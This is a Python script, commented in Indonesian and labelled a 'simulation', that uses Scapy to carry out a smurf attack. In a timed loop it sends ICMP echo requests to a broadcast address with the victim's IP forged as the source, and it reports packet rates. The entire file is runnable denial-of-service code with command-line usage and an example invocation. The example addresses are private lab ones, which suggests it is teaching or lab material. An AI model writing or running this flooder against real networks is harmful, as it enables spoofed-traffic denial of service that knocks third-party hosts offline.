#!/usr/bin/env python3
"""
Smurf Attack Simulation
Mengirim ICMP echo request ke broadcast dengan source IP spoofing
"""

from scapy.all import IP, ICMP, send, conf
import sys
import time

# Disable timeout dialog
conf.verb = 0

def smurf_attack(target_ip, broadcast_addr, duration=10, interval=0.1):
    """
    Launch smurf attack

    Args:
        target_ip: IP korban (akan dipalsukan sebagai source)
        broadcast_addr: Broadcast address jaringan
        duration: Lama serangan (detik)
        interval: Interval antar paket (detik)
    """
    print(f"[*] Starting Smurf Attack")
    print(f"[*] Target IP: {target_ip}")
    print(f"[*] Broadcast Address: {broadcast_addr}")
    print(f"[*] Duration: {duration} seconds")
    print(f"[*] Packet interval: {interval} seconds")
    print(f"[!] Press Ctrl+C to stop\n")

    start_time = time.time()
    packet_count = 0

    try:
        while time.time() - start_time < duration:
            # Create ICMP echo request with spoofed source IP
            pkt = IP(src=target_ip, dst=broadcast_addr) / ICMP()

            # Send packet
            send(pkt, verbose=0)
            packet_count += 1

            # Display progress
            if packet_count % 10 == 0:
                elapsed = time.time() - start_time
                rate = packet_count / elapsed
                print(f"[+] Sent {packet_count} packets ({rate:.1f} pkt/s) - Elapsed: {elapsed:.1f}s")

            time.sleep(interval)

    except KeyboardInterrupt:
        print(f"\n[!] Attack stopped by user")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        elapsed = time.time() - start_time
        rate = packet_count / elapsed if elapsed > 0 else 0
        print(f"\n[*] Attack Statistics:")
        print(f"    Total packets sent: {packet_count}")
        print(f"    Duration: {elapsed:.2f} seconds")
        print(f"    Average rate: {rate:.1f} packets/second")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 smurf_attack.py <target_ip> <broadcast_addr> [duration] [interval]")
        print("\nExample:")
        print("  python3 smurf_attack.py 192.168.50.3 192.168.50.255 10 0.1")
        sys.exit(1)

    target_ip = sys.argv[1]
    broadcast_addr = sys.argv[2]
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 10
    interval = float(sys.argv[4]) if len(sys.argv) > 4 else 0.1

    smurf_attack(target_ip, broadcast_addr, duration, interval)
